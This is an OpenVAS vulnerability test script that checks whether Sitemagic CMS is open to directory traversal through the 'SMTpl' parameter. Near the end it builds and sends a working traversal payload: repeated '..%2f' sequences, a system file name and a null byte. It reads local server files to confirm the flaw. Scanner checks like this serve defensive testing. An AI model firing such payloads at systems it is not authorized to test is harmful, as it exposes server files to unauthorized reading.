###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_sitemagic_cms_dir_traversal_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Sitemagic CMS 'SMTpl' Parameter Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to obtain arbitrary local files
  in the context of the web server process.
  Impact Level: Application";
tag_affected = "Sitemagic CMS version 2010.04.17";
tag_insight = "The flaw is due to improper sanitisation of user supplied input through
  the 'SMTpl' parameter in 'index.php'.";
tag_solution = "No solution or patch is available as of 24th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sitemagic.org/DownloadCMS.html";
tag_summary = "This host is running Sitemagic CMS and is prone to directory
  traversal vulnerability.";

if(description)
{
  script_id(902452);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_bugtraq_id(48399);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Sitemagic CMS 'SMTpl' Parameter Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check for directory traversal vulnerability in Sitemagic CMS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/48399/exploit");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102498/sitemagic-traversal.txt");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

if(!can_host_php(port:port)){
  exit(0);
}

## Check for each possible path
foreach dir (make_list("/Sitemagic", "CMS", "/"))
{
  ## Send and Receive the response
  req = http_get(item:string(dir, "/index.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if("<title>Sitemagic CMS</title>" >< res)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Contstuct exploit string
      url = string(dir,"/index.php?SMTpl=", crap(data:"..%2f",length:5*10),
                   files[file], "%00.jpg");

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_hole(port:port);
        exit(0);
      }
    }
  }
}
